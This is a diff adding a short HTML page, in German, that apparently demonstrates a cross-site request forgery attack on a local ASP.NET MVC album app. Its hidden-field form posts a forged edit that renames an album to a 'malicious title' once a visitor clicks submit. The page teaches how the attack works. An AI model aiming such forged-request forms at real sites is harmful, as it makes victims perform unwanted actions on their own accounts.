@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+    <h1>Ändere das Album in der ASP.NET MVC App</h1>
+    <form action="https://localhost:44398/Albums/Edit/4" method="POST">
+        <input type="hidden" name="AlbumId" value="4">
+        <input type="hidden" name="Title" value="Bösartiger Titel">
+        <input type="hidden" name="ArtistId" value="1">
+        <input type="submit" value="Absenden">
+    </form>
+    <p>Sobald der Nutzer diese Seite besucht und auf den Knopf drückt, wird der Albumtitel geändert.</p>
+</body>
+</html>
